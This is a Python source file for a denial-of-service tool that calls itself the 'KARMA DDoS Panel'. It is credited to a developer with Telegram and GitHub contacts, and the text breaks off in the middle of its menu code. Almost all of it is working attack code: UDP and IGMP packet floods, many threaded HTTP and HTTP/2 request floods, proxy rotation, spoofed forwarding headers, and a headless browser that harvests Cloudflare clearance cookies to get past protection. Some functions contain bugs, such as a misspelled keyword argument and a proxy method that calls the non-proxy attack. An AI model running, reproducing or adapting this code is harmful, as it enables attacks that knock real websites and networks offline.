# Developer - @solve
# Contact me here - Telegram - https://t.me/internalvpn
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
from colorama import Fore, Style
from sys import stdout

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.CYAN+"[*]"+Fore.RED+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.CYAN+"[*]"+Fore.RED+" Attack Done !                                   \n")
            return


def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.CYAN+" [*]"+Fore.RED+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"URL      "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"THREAD   "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"TIME(s)  "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"IP       "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"PORT     "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"THREAD   "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.RED+"TIME(s)  "+Fore.CYAN+": "+Fore.LIGHTCYAN_EX)
    t = input()
    return target, port, thread, t
##############################################################################################

#region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
            
#endregion

#region METHOD

#region HEAD

def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
        except:
            pass


def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass
#endregion

#region POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass
#endregion

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://'+str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,   
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass
#endregion

#region PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return
#endregion

#region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass

def AttackPPS(target, until_datetime): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy): #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_CYANirects=False)
            scraper.get(url=url, headers=headers, allow_CYANirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    #req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass




def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.RED   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.CYAN    +"  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 "+Fore.RED    +"  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             "+Fore.CYAN            +"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"layer7   "+Fore.CYAN+"|"+Fore.RED+" Show Layer7 Methods                    "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"layer4   "+Fore.CYAN+"|"+Fore.RED+" Show Layer4 Methods                    "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"tools    "+Fore.CYAN+"|"+Fore.RED+" Show tools                             "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"exit     "+Fore.CYAN+"|"+Fore.RED+" Exit KARMA DDoS Panel                  "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"Socials  "+Fore.CYAN+"|"+Fore.RED+" https://glock.rip/solve               "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"GitHub   "+Fore.CYAN+"|"+Fore.RED+" https://github.com/internalvpn        "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"║ \x1b[38;2;255;20;147m• "+Fore.RED+"Read     "+Fore.CYAN+"|"+Fore.RED+" Star this project or u gay ;)          "+Fore.CYAN+"║\n")
    stdout.write("             "+Fore.CYAN            +"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def cCYANit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +"Developer "+Fore.CYAN+": \x1b[38;2;0;255;189m@solve\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +" "+Fore.CYAN+": \x1b[38;2;0;255;189m\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   +" "+Fore.CYAN+": \x1b[38;2;0;255;189m\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    

def layer7():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                               "+Fore.RED   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                               "+Fore.CYAN    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                               "+Fore.RED    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")

    stdout.write("            "+Fore.CYAN            +"╔══════════════════════════════════════════════════════╗\n")
